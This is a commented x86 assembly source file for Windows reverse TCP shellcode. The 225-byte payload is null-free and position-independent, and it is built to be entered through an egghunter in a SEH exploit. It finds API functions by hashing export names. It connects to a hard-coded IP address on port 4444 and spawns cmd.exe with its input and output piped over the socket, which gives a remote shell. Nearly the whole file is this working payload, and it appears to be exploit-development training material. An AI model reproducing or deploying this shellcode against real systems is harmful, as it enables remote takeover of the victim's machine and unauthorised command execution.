;-------------------------------------------------------------------------------------------;
; Author: Shadi Habbal (@Kerpanic), @TheCyberBepop
; Tested on: Windows 10.0.16299 (x86)
; Version: 1.0 (06 June 2021)
;-------------------------------------------------------------------------------------------;
; Characteristics: 225 bytes, Position-Independent-Code (PIC), NULL-free, Reverse TCP shell
;-------------------------------------------------------------------------------------------;
; Assumptions: ws2_32.dll is already loaded and win sockets are initialized
;-------------------------------------------------------------------------------------------;

fake_start:
  ;int3                       ; bp for windbg, remove when not debugging

find_function:
  pushad                      ; EBX has base_address of module to enumerate
  mov eax, [ebx+0x3c]         ; offset to PE signature
  mov edi, [ebx+eax+0x78]     ; Export Table Directory RVA
  add edi, ebx                ; Export Table Directory VMA
  mov ecx, [edi+0x18]         ; NumberOfNames
  mov eax, [edi+0x20]         ; AddressOfNames RVA
  add eax, ebx                ; AddressOfNames VMA
  mov [ebp-4], eax            ; save AddressOfNames VMA for later use

  find_function_loop:
    jecxz find_function_finished    ; jmp to end if ECX = 0
    dec ecx                         ; dec our names counter
    mov eax, [ebp-4]                ; restore AddressOfNames VMA
    mov esi, [eax+ecx*4]            ; get RVA of the symbol name
    add esi, ebx                    ; ESI = VMA of the current symbol names

    compute_hash:
      xor eax, eax        ; EAX = 0
      cdq                 ; EDX = 0 (CDQ converts double quad (extends EAX to EDX which clears EDX)
      cld                 ; clear Direction Flag

      compute_hash_again:
        lodsb               ; load the next byte from ESI into AL and automatically increase ESI based on DF
        test al, al
        jz compute_hash_finished
        ror edx, 0x0d       ; rotate EDX 13 bits to the right
        add edx, eax        ; add the new byte to the accumulator
        jmp compute_hash_again

      compute_hash_finished:

    find_function_compare:
      cmp edx, [esp+0x24]     ; compare computed hash with the requested hash on stack
      jnz find_function_loop  ; if not found, move on to next function

      mov edx, [edi+0x24]     ; AddressOfNameOrdinals RVA: MAKE SURE THE OFFSET ESP+0x24 HOLDS THE PRECOMPUTED HASH, IT MAY VARY
      add edx, ebx            ; AddressOfNameOrdinals VMA
      mov cx, [edx+ecx*2]     ; get the function's AddressOfNameOrdinals
      mov edx, [edi+0x1c]     ; AddressOfFunctions RVA
      add edx, ebx            ; AddressOfFunctions VMA
      mov eax, [edx+ecx*4]    ; get the function RVA
      add eax, ebx            ; get the function VMA
      mov [esp+0x1c], eax     ; overwrite stack version of EAX from pushad

  find_function_finished:
  popad                       ; restore the state of EBX, ECX, EDI (and other junk REGs)
  pop esi                     ; pop ret addr
  pop edx                     ; remove function hash off top of stack
  push esi                    ; put ret addr back to stack to simulate a call with the next jmp
  jmp eax                     ; call the found function without storing a ret addr on stack. The one we already have will be used at the end of the function's logic to return to our shell at the right position

real_start:
  ; w00tw00t goes here. Your egghunter enters the shellcode at this block.
  ; Most modern egghunters check for the tag by looping. ECX is therefore used and is 0 before entering the shellcode.
  ; We assume that the egghunter is using EDI to jmp/call into the shellcode.
  
  ; EAX = junk
  ; EBX = addr of w00tw00t
  ; ECX = 0 (ECX is used as counter in the egghunter and reaches 0 before executing our shellcode)
  ; EDX = junk
  ; ESI = junk
  ; EDI = addr of real_start

  ; SEH-egghunter jumps here based on @EDI 
  lea edi, [edi-0x5B]         ; EDI = address of find_function. 0x5B is the size of the find_function block

  ; EAX = junk
  ; EBX = addr of w00tw00t
  ; ECX = 0
  ; EDX = junk
  ; ESI = junk
  ; EDI = addr of find_function

  mov ebp, esp                ; save top of stack frame
  add esp, 0xffffffee         ; give us 12 bytes buffer on stack to avoid clobbering it when saving our pointers

find_kernel32:
  ; ECX should be NULL
  mov esi, fs:[ecx+30h]       ; ESI = &(PEB) ([fs:0x30])
  mov esi, [esi+0ch]          ; ESI = PEB->Ldr
  mov esi, [esi+0x14]         ; ESI = PEB->Ldr.InMemOrder (program module)
  lodsd                       ; EAX = [ESI] (ntdll.dll)
  xchg eax, esi               ; ESI = EAX
  lodsd                       ; EAX = [ESI] (KERNEL32.dll)
  mov esi, [eax+0x10]         ; ESI = DllBase KERNEL32.dll (EAX - 0x8 + 0x18)
  mov [ebp-8], esi            ; save base address of kernel32.dll on stack for later

  ; EAX = junk
  ; EBX = addr of w00tw00t
  ; ECX = 0
  ; EDX = junk
  ; ESI = junk
  ; EDI = addr of find_function

find_ws2_32:
  xchg eax, esi                         ; ESI = EAX (current module)
  lodsd                                 ; EAX = [ESI] (next module)
  mov ebx, [eax+0x28]                   ; EBX = BaseDllName
  cmp byte ptr [ebx+3*2], 0x5F          ; 4th letter match "_" ? this should be changed should your vulnerable application load modules with _ as their 4th char.
  jne find_ws2_32                       ; No: try next module.
  mov ebx, [eax+0x10]                   ; EBX = base address of ws2_32.dll

; EAX = junk
; EBX = baseaddr of ws2_32.dll
; ECX = 0
; EDX = junk
; ESI = junk
; EDI = addr of find_function

start_prepare_sockaddr_in:
  push ecx                          ; (create_sockaddr_in) push sin_zero[]
  push ecx                          ; (create_sockaddr_in) push sin_zero[] - twice because it's an 8 byte array

call_wsasocket:
  push ecx                    ; push dwFlags
  push ecx                    ; push g
  push ecx                    ; push lpProtocolInfo
  push ecx					          ; push protocol (NULL). When not set, it's auto picked based on type and af
  push 1                      ; push type (SOCK_STREAM=1)
  push 2                      ; push af (AF_INET=2)
  push 0xadf509d9             ; "WSASocketA" hash
  call edi                    ; call find_function

; EAX = socket handle
; EBX = baseaddr of ws2_32.dll
; ECX = junk
; EDX = junk
; ESI = address of create_sockaddr_in
; EDI = addr of find_function

create_sockaddr_in:                 ; we need to prepare sockaddr_in struct for use
  push 0x4c31a8c0                   ; push sin_addr (192.168.49.76) - REMEMBER it's reversed
  mov ecx, 0xA3EEFFFE               ; 
  neg ecx                           ; ECX = 0x5c110002
  push ecx                          ; push (sin_family 0x0002 + sin_port 0x115c)
  push esp                          ; push pointer to sockaddr_in struct which is now on the top of the stack
  pop ecx                           ; ECX = pointer to sockaddr_in struct on stack

; EAX = socket handle
; EBX = baseaddr of ws2_32.dll
; ECX = pointer to sockaddr_in struct on stack
; EDX = junk
; ESI = EIP (address of start_prepare_startupinfoa)
; EDI = addr of find_function

start_prepare_startupinfoa:
                              ; EAX holds socket handle so we put it on the stack for the create_startupinfoa block in advance before it's overwritten by "connect"
                              ; pipe err/out/in to hSocket
  push eax                    ; push hStdError
  push eax                    ; push hStdOutput
  push eax                    ; push hStdInput

call_connect:
  push 0x10                   ; push sizeof(sockaddr_in)
  push ecx                    ; push *name
  push eax                    ; push hSocket
  push 0x60aaf9ec             ; "connect" hash
  call edi                    ; call find_function

; EAX = 0
; EBX = baseaddr of ws2_32.dll
; ECX = junk
; EDX = 0
; ESI = EIP (address of create_startupinfoa)
; EDI = addr of find_function

create_startupinfoa:
                            ; hStdError / hStdOutput / hStdInput already set on stack above
  push eax                  ; push lpReserved2 (NULL)
  push eax                  ; push cbReserved & wShowWindow
  mov dl, 0xFF
  inc dx
  push edx                  ; push dwFlags (0x100)
  push 10
  pop ecx
  dup:
  push eax                  ; push NULL ECX times
  loop dup
  push 0x44                 ; push cb
  push esp                  ; push pointer to the STARTUPINFOA struct
  pop ecx                   ; ECX = pointer of STARTUPINFOA struct

; EAX = 0
; EBX = baseaddr of ws2_32.dll
; ECX = pointer of STARTUPINFOA struct
; EDX = 0x00000100
; ESI = EIP (address of create_startupinfoa)
; EDI = addr of find_function

create_cmd_string:
  mov edx, 0xFF9B929D       ;
  neg edx                   ; EDX = "cmd\\0"
  push edx                  ; push "cmd\\0" on stack
  push esp                  ; get pointer to string
  pop edx                   ; EDX = ptr to "cmd\\0"

; EAX = 0
; EBX = baseaddr of ws2_32.dll
; ECX = pointer of STARTUPINFOA struct
; EDX = pointer of "cmd\\0"
; ESI = EIP (address of create_startupinfoa)
; EDI = addr of find_function

call_createprocessa:
  push esp                    ; push lpProcessInformation. We don't care if the stack is polluted at this stage. It doesn't affect the next call.
                              ; otherwise do "lea ebx, [esp-390]; push ebx"
  push ecx                    ; push lpStartupInfo
  push eax                    ; push lpCurrentDirectory
  push eax                    ; push lpEnvironment
  push eax                    ; push dwCreationFlags
  push 1                      ; push bInheritHandles (0x01 (TRUE))
  push eax                    ; push lpThreadAttributes
  push eax                    ; push lpProcessAttributes
  push edx                    ; push lpCommandLine
  push eax                    ; push lpApplicationName
  push 0x16b3fe72             ; CreateProcess
  mov ebx, [ebp-8]            ; EBX = baseaddr of kernel32
  call edi                    ; call find_function

; EAX = 1
; EBX = baseaddr of ws2_32.dll
; ECX = junk
; EDX = 0
; ESI = EIP (address of call_exitprocess)
; EDI = addr of find_function

call_exitprocess:
                              ; expects uExitCode, but we don't care so we use whatever on stack
  push 0x73e2d87e             ; "ExitProcess" hash
  ; push 0x60e0ceef             ; "ExitThread" hash
  call edi                    ; call find_function
